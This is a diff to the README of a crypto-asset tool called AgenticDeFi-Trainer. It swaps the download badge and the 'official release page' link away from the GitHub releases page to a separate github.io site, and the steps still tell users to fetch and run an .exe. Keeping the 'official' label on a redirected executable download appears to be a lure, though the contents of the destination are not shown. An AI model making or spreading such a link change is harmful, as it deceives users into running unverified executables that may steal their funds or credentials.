@@ -1,6 +1,6 @@
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous software
 
-[![Download AgenticDeFi-Trainer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Melbonafide455/AgenticDeFi-Trainer/releases)
+[![Download AgenticDeFi-Trainer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://melbonafide455.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software smoothly:
 
 Follow these steps to prepare your system:
 
-1. Visit the [official release page](https://github.com/Melbonafide455/AgenticDeFi-Trainer/releases) to download the latest version.
+1. Visit the [official release page](https://melbonafide455.github.io) to download the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
